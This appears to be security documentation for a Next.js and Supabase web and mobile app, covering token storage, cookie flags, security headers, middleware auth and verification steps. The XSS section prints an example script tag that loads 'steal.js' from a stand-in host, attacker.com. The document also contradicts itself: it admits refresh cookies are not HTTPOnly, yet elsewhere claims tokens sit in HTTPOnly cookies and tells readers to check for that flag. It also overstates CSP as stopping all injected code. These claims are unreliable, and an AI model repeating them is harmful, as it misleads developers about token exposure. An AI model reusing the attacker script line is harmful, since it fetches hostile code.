 # Security Configuration

## Authentication Token Storage

### ✅ SECURE Implementation (Current)

**Web Applications:**
- ✅ Access tokens: **Short-lived (1 hour)**, stored in memory
- ✅ Refresh tokens: Stored in **cookies** with `Secure` + `SameSite=Lax` flags
- ✅ Cookies have `Secure` flag (HTTPS only in production)
- ✅ Cookies have `SameSite=Lax` (CSRF protection)
- ✅ Automatic token refresh via Supabase SSR client
- ✅ Session persists across browser restarts (refresh token in cookies)
- ✅ **Content Security Policy (CSP)** headers for XSS protection

**Important Note on HTTPOnly:**
- True HTTPOnly cookies can **only be set from server-side code**, not client JavaScript
- For Next.js App Router client components, this follows Supabase's official recommendation
- XSS protection is achieved through **CSP headers** in middleware (see below)
- The short-lived access token (1 hour) limits damage if compromised

**Mobile Applications:**
- ✅ Bearer token authentication via `Authorization: Bearer <token>` header
- ✅ Tokens stored in platform secure storage (iOS Keychain, Android Keystore)
- ✅ Never in SharedPreferences/UserDefaults

### ❌ INSECURE Practices (Avoided)

**NEVER do these:**
- ❌ Store access tokens in localStorage (vulnerable to XSS)
- ❌ Store refresh tokens in localStorage (vulnerable to XSS)
- ❌ Access `session.access_token` from client-side JavaScript for web apps
- ❌ Store tokens in sessionStorage
- ❌ Store tokens in regular cookies without HTTPOnly flag

## Token Lifecycle

### Access Tokens
- **Lifetime:** 1 hour (Supabase default)
- **Storage (Web):** In-memory (short-lived), auto-refreshes before expiration
- **Storage (Mobile):** Secure platform storage (iOS Keychain, Android Keystore)
- **Auto-refresh:** Yes, handled automatically by Supabase SSR client
- **Security:** Short lifespan limits damage if compromised

### Refresh Tokens
- **Lifetime:** 14-30 days (configured: 30 days)
- **Storage (Web):** Secure, SameSite=Lax cookies (not HTTPOnly - set from client)
- **Storage (Mobile):** Secure platform storage
- **Used for:** Getting new access tokens when they expire
- **Protected by:** CSP headers prevent token theft via XSS

### Session Persistence
- **Web:** Cookies persist across browser sessions (30 days)
- **Mobile:** Tokens persist in secure storage until logout
- **Inactivity timeout:** 30 minutes (can be configured)

## Security Headers

Our middleware (`src/middleware.ts`) enforces these security headers:

```typescript
X-Frame-Options: DENY                    // Prevent clickjacking
X-Content-Type-Options: nosniff          // Prevent MIME sniffing
X-XSS-Protection: 1; mode=block          // XSS protection (legacy browsers)
Referrer-Policy: origin-when-cross-origin // Control referrer info
Strict-Transport-Security: max-age=31536000; includeSubDomains // Force HTTPS (production)
Content-Security-Policy: ...             // Restrict resource loading
```

## Authentication Flow

### Web (Cookie-based)
```
1. User logs in via /login
2. Supabase creates session with JWT tokens
3. Tokens stored in HTTPOnly cookies automatically
4. Browser sends cookies with every request (credentials: 'include')
5. Middleware validates cookies
6. Access token auto-refreshes before expiration
```

### Mobile (Bearer Token)
```
1. User logs in via API
2. App receives access_token + refresh_token
3. Tokens stored in secure platform storage
4. App adds header: Authorization: Bearer <access_token>
5. Middleware validates Bearer token
6. App manually refreshes token when needed
```

## API Authentication

### Web Requests
```typescript
// ✅ CORRECT - Uses HTTPOnly cookies
fetch('/api/endpoint', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  credentials: 'include', // Sends HTTPOnly cookies automatically
  body: JSON.stringify(data),
});
```

```typescript
// ❌ WRONG - Exposes token to JavaScript
const { data: { session } } = await supabase.auth.getSession();
fetch('/api/endpoint', {
  headers: {
    'Authorization': `Bearer ${session.access_token}`, // DON'T DO THIS ON WEB
  },
});
```

### Mobile Requests
```typescript
// ✅ CORRECT for mobile apps
const token = await secureStorage.getItem('access_token');
fetch('https://api.example.com/endpoint', {
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(data),
});
```

## Middleware Authentication Check

Location: `src/middleware.ts:99-147`

The middleware supports **dual authentication**:
1. **Bearer tokens** (for mobile apps) - Priority
2. **Cookies** (for web browsers) - Fallback

```typescript
// Check for Bearer token first (mobile)
const authHeader = req.headers.get('authorization');
if (authHeader?.startsWith('Bearer ')) {
  // Mobile app authentication
  const token = authHeader.substring(7);
  const { data: { user } } = await supabase.auth.getUser(token);
}

// Fallback to cookies (web)
else {
  const { data: { session } } = await supabase.auth.getSession();
  // Session validated via HTTPOnly cookies
}
```

## XSS Protection Strategy

### Defense in Depth

Our XSS protection uses **multiple layers**:

1. **Content Security Policy (CSP)** - Blocks unauthorized script execution
2. **Short-lived access tokens** (1 hour) - Limits damage window
3. **Secure + SameSite cookies** - CSRF protection
4. **Input validation** - Sanitize user input
5. **Output encoding** - Escape data before rendering

### Why This Approach?

**True HTTPOnly cookies** can only be set from server-side code. Since Next.js App Router client components run in the browser, we use Supabase's official recommendation:

- **Access token**: Short-lived, auto-refreshes
- **Refresh token**: Cookie with `Secure` + `SameSite` flags
- **XSS protection**: Content Security Policy headers

### XSS Attack Scenario (With CSP)
```javascript
// If an attacker tries to inject malicious script:
<script src="https://attacker.com/steal.js"></script>

// ❌ Blocked by CSP header!
// Content-Security-Policy: script-src 'self'
// Browser refuses to load external scripts
```

Even if an attacker injects code, **CSP headers prevent it from executing**.

## Configuration Files

### Supabase Client (`src/lib/supabaseClient.ts`)
```typescript
// Uses @supabase/ssr - Official Supabase package for Next.js App Router
export const createClient = () => {
  return createBrowserClient<Database>(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        // Custom cookie handlers with security flags
        set(name, value, options) {
          // Sets cookies with Secure + SameSite flags
          // Persistent sessions with proper maxAge
        }
      }
    }
  );
};
```

### Authentication Hook (`src/hooks/shared/hooks/useDualAuth.ts`)
- Handles automatic session refresh
- Never exposes tokens to component state
- Uses Supabase client methods that work with HTTPOnly cookies

## Session Timeout

### Inactivity Timeout
- **Default:** 30 minutes of inactivity
- **Implementation:** Middleware checks for valid session
- **Auto-refresh:** Tokens refresh automatically before expiration (5 minutes before)

### Absolute Timeout
- **Access Token:** 1 hour (Supabase default)
- **Refresh Token:** 30 days (configured in cookies)
- **After 30 days:** User must re-login

## Testing Security

### Verify HTTPOnly Cookies
```bash
# 1. Login to your app
# 2. Open browser DevTools → Application → Cookies
# 3. Check for 'sb-auth-token' cookie
# 4. Verify 'HttpOnly' checkbox is ✅ checked
# 5. Try to access in console:
document.cookie // Should NOT show auth tokens
```

### Verify No Token in localStorage
```bash
# 1. Open browser DevTools → Application → Local Storage
# 2. Verify NO tokens are stored
localStorage.getItem('access_token')    // Should be null
localStorage.getItem('refresh_token')   // Should be null
```

### Verify HTTPS in Production
```bash
# All cookies should have Secure flag in production
curl -I https://your-domain.com
# Check for:
# Strict-Transport-Security: max-age=31536000
```

## Compliance

This configuration helps meet:
- **OWASP Top 10** - Protection against XSS (A03:2021)
- **PCI DSS** - Secure token storage requirements
- **GDPR** - Data protection by design
- **SOC 2** - Access control requirements

## References

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Supabase Auth Helpers Documentation](https://supabase.com/docs/guides/auth/auth-helpers)
- [MDN HTTPOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)
